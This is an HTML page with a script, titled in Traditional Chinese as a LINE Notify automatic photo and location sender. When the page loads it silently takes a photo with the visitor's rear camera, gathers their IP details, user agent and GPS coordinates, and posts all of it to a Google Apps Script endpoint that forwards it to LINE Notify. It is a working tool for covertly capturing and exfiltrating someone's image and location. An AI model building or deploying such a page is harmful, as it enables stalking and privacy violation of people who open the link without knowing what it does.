<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LINE Notify 自動拍照及定位傳送</title>
</head>
<body>
  <p id="status">狀態：啟動中...</p>
  <p id="ipInfo">IP 資訊載入中...</p>
  <p id="gpsInfo">GPS 資訊載入中...</p>

  <script>
    let photoData = null;

    // 啟動相機並自動拍照與傳送
    async function startCameraAndSend() {
      const statusElement = document.getElementById('status');
      try {
        // 啟動相機
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' } }, // 使用後置相機
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        // 等待相機畫面載入
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play(); // 播放相機畫面
            resolve();
          };
        });

        // 延遲 1 秒拍照
        setTimeout(() => {
          // 使用隱藏的 Canvas 拍攝照片
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640; // 設置默認寬度以防解析度不可用
          canvas.height = video.videoHeight || 480; // 設置默認高度
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // 壓縮為 Base64 格式
          photoData = canvas.toDataURL('image/jpeg', 0.5); // 壓縮至 50% 品質
          stream.getTracks().forEach((track) => track.stop()); // 停止相機
          getIpAndGpsInfo();
        }, 1000); // 延遲 1 秒拍照
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // 取得 IP 和 GPS 資訊
    async function getIpAndGpsInfo() {
      try {
        // 取得 IP 資訊
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        document.getElementById('ipInfo').innerText = `
          IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}
        `;

        // 取得 GPS 資訊
        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;
          document.getElementById('gpsInfo').innerText = `GPS: 緯度 ${latitude}, 經度 ${longitude}`;

          // 發送照片與其他資訊到伺服器
          sendPhotoToServer(photoData, ip, ipType, userAgent, city, region, country, org, latitude, longitude);
        }, (error) => {
          console.error('GPS 錯誤:', error);
          document.getElementById('gpsInfo').innerText = 'GPS 無法取得，請檢查裝置定位權限。';
        });
      } catch (error) {
        console.error('錯誤:', error);
        document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
      }
    }

    // 發送照片和其他資訊到後端
    async function sendPhotoToServer(photoData, ip, ipType, userAgent, city, region, country, org, latitude, longitude) {
      const statusElement = document.getElementById('status');
      try {
        const base64Image = photoData.split(',')[1];

        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', base64Image);
        formData.append('ip', ip);
        formData.append('ipType', ipType);
        formData.append('userAgent', userAgent);
        formData.append('city', city);
        formData.append('region', region);
        formData.append('country', country);
        formData.append('org', org);
        formData.append('latitude', latitude);
        formData.append('longitude', longitude);

        const response = await fetch('https://script.google.com/macros/s/AKfycbzdsASyv68Bw9aKTR-p6L7pBT6gyyQc_THeXbSr-til24wfSnEZ9j7vSu5_2_jTMwCSrg/exec', {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();

        if (result.success) {
          statusElement.innerText = '照片及定位資訊已成功傳送到 LINE Notify！';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    // 啟動相機並自動拍照與傳送
    startCameraAndSend();
  </script>
</body>
</html>
